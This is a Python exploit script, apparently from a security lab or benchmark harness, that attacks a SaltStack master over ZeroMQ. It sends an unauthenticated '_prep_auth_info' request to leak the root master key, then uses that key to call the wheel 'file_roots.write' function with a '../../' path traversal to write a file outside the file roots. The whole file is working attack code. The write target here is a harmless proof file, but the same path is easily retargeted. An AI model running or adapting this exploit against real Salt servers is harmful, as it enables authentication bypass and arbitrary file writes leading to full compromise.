#!/usr/bin/env python3
"""Create a file outside Salt's file roots through wheel path traversal."""

import importlib
import json
import os
from pathlib import Path
import subprocess
import sys
import tempfile
import urllib.parse


TRAVERSAL_PATH = "../../tmp/dojo-file-creation/saltstack-002-write-proof"


def load_client_modules() -> tuple[object, object]:
    try:
        return importlib.import_module("zmq"), importlib.import_module("msgpack")
    except ImportError:
        directory = Path(tempfile.mkdtemp(prefix="saltstack-002-client-"))
        subprocess.run(
            [sys.executable, "-m", "pip", "install", "--disable-pip-version-check",
             "--no-cache-dir", "--quiet", "--target", str(directory),
             "pyzmq==27.1.0", "msgpack==1.1.1"],
            check=True,
            stdout=subprocess.DEVNULL,
        )
        sys.path.insert(0, str(directory))
        return importlib.import_module("zmq"), importlib.import_module("msgpack")


def send_clear_request(endpoint: str, load: dict, zmq: object,
                       msgpack: object) -> object:
    context = zmq.Context.instance()
    connection = context.socket(zmq.REQ)
    connection.setsockopt(zmq.RCVTIMEO, 30000)
    connection.setsockopt(zmq.SNDTIMEO, 30000)
    connection.connect(endpoint)
    try:
        connection.send(msgpack.packb({"enc": "clear", "load": load},
                                      use_bin_type=False))
        return msgpack.unpackb(connection.recv(), raw=False)
    finally:
        connection.close()


def main() -> None:
    target = urllib.parse.urlsplit(os.environ["REMOTE_TARGET_URL"])
    if not target.hostname:
        raise RuntimeError("target URL lacks a host")
    endpoint = f"tcp://{target.hostname}:{target.port or 80}"
    zmq, msgpack = load_client_modules()
    auth_info = send_clear_request(endpoint, {"cmd": "_prep_auth_info"},
                                   zmq, msgpack)
    if not (isinstance(auth_info, list) and len(auth_info) > 2
            and isinstance(auth_info[2], dict) and len(auth_info[2]) == 1):
        raise RuntimeError("Salt did not disclose its master key")
    root_key = next(iter(auth_info[2].values()))
    reply = send_clear_request(endpoint, {
        "key": root_key,
        "cmd": "wheel",
        "fun": "file_roots.write",
        "path": TRAVERSAL_PATH,
        "data": "Created by Salt file roots traversal\n",
        "saltenv": "base",
    }, zmq, msgpack)
    if not isinstance(reply, dict):
        raise RuntimeError("Salt did not return a wheel result")
    result = reply.get("data")
    if not isinstance(result, dict) or result.get("success") is not True:
        raise RuntimeError("Salt rejected the file write")
    print(json.dumps({"evidence_payload": {}}))


if __name__ == "__main__":
    main()
